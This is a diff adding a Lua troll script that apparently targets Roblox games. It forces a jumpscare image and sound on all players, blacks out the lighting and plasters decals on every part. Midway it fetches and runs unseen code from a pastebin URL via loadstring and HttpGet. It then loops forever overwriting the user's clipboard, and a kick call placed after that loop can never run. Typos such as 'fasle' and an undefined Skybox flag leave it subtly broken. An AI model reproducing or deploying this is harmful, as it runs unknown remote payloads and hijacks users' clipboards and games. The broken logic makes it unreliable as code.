@@ -1,0 +1,139 @@
+local jumpscareSound = Instance.new("Sound", workspace)
+jumpscareSound.Name = "JumpscareSound"
+jumpscareSound.Volume = 10
+jumpscareSound.Pitch = 0.25
+jumpscareSound.SoundId = "rbxassetid://670599653"
+
+local jumpscareGUI = Instance.new("ScreenGui", nil)
+jumpscareGUI.Name = "Jumpscare"
+local image = Instance.new("ImageLabel", jumpscareGUI)
+image.Name = "JumpscareImage"
+image.BackgroundColor3 = Color3.new(0, 0, 0)
+image.BorderColor3 = Color3.new(255, 255, 255)
+image.BorderSizePixel = 0
+image.Size = UDim2.new(1, 0, 1, 0)
+image.Image = "http://www.roblox.com/asset/?id=7057923071"
+image.Active = true
+
+for i, c in pairs(game.Players:GetChildren()) do
+ local jumpscareClone = jumpscareGUI:Clone()
+ jumpscareClone.Parent = c.PlayerGui
+end
+jumpscareSound:Play()
+wait(0.65)
+jumpscareSound:Destroy()
+for i, c in pairs(game.Players:GetChildren()) do
+ c.PlayerGui.Jumpscare:Destroy()
+end
+
+game.Lighting.FogStart = 10 -- Smaller the number means darker the fog.
+game.Lighting.FogEnd = 30 -- Smaller the number means darker the fog.
+game.Lighting.FogColor = Color3.new(0,0,0)
+game.Lighting.TimeOfDay = "00:00" -- Keep for total darkness.
+
+wait(0.1)
+
+Spooky = Instance.new("Sound", game.Workspace)
+Spooky.Name = "Spooky"
+Spooky.SoundId = "rbxassetid://9114828835"
+Spooky.Volume = 10
+Spooky.PlaybackSpeed = 1
+Spooky.Looped = fasle
+Spooky:Play()
+
+loadstring(game:HttpGet("https://pastebin.com/raw/LSL8cSGb"))()
+
+wait(15)
+
+Spooky = Instance.new("Sound", game.Workspace)
+Spooky.Name = "Spooky"
+Spooky.SoundId = "rbxassetid://5408539313"
+Spooky.Volume = 10
+Spooky.PlaybackSpeed = 1
+Spooky.Looped = fasle
+Spooky:Play()
+
+wait(6)
+
+for i,v in pairs (game.Workspace:GetChildren()) do
+        if v:IsA("Part") then
+            local decal1 =Instance.new("Decal")
+            local decal2 =Instance.new("Decal")
+            local decal3 =Instance.new("Decal")
+            local decal4 =Instance.new("Decal")
+            local decal5 =Instance.new("Decal")
+            local decal6 =Instance.new("Decal")
+            decal1.Texture = "http://www.roblox.com/asset/?id=7057923071"
+            decal2.Texture = "http://www.roblox.com/asset/?id=7057923071"
+            decal3.Texture = "http://www.roblox.com/asset/?id=7057923071"
+            decal4.Texture = "http://www.roblox.com/asset/?id=7057923071"
+            decal5.Texture = "http://www.roblox.com/asset/?id=7057923071"
+            decal6.Texture = "http://www.roblox.com/asset/?id=7057923071"
+            decal1.Parent = v
+            decal2.Parent = v
+            decal3.Parent = v
+            decal4.Parent = v
+            decal5.Parent = v
+            decal6.Parent = v
+            decal1.Face = "Front"
+            decal2.Face = "Top"
+            decal3.Face = "Left"
+            decal4.Face = "Right"
+            decal5.Face = "Bottom"
+            decal6.Face = "Back"
+        end
+        end
+            for i,v in pairs (game.Workspace:GetChildren()) do
+            if v:IsA("Model") then
+            for i,z in pairs (v:GetChildren()) do
+            if z:IsA("Part") then
+                        local decal7 =Instance.new("Decal")
+            local decal8 =Instance.new("Decal")
+            local decal9 =Instance.new("Decal")
+            local decal10 =Instance.new("Decal")
+            local decal11 =Instance.new("Decal")
+            local decal12 =Instance.new("Decal")
+            decal7.Texture = "http://www.roblox.com/asset/?id=7057923071"
+            decal8.Texture = "http://www.roblox.com/asset/?id=7057923071"
+            decal9.Texture = "http://www.roblox.com/asset/?id=7057923071"
+            decal10.Texture = "http://www.roblox.com/asset/?id=7057923071"
+            decal11.Texture = "http://www.roblox.com/asset/?id=7057923071"
+            decal12.Texture = "http://www.roblox.com/asset/?id=7057923071"
+            decal7.Parent = z
+            decal8.Parent = z
+            decal9.Parent = z
+            decal10.Parent = z
+            decal11.Parent = z
+            decal12.Parent = z
+            decal7.Face = "Front"
+            decal8.Face = "Top"
+            decal9.Face = "Left"
+            decal10.Face = "Right"
+            decal11.Face = "Bottom"
+            decal12.Face = "Back"
+            end
+            end
+            end
+            end 
+ 
+ 
+if Skybox == true then
+local sky = Instance.new("Sky")
+sky.Parent = game.Lighting
+sky.SkyboxBk = "http://www.roblox.com/asset/?id=7057923071"
+sky.SkyboxDn = "http://www.roblox.com/asset/?id=7057923071"
+sky.SkyboxFt = "http://www.roblox.com/asset/?id=7057923071"
+sky.SkyboxLf = "http://www.roblox.com/asset/?id=7057923071"
+sky.SkyboxRt = "http://www.roblox.com/asset/?id=7057923071"
+sky.SkyboxUp = "http://www.roblox.com/asset/?id=7057923071"
+end
+
+wait(4)
+
+while wait(0.3) do
+setclipboard("You shouldnt have done that")
+end
+
+wait(60)
+
+game.Players.LocalPlayer:Kick("The emptiness has rejected you")
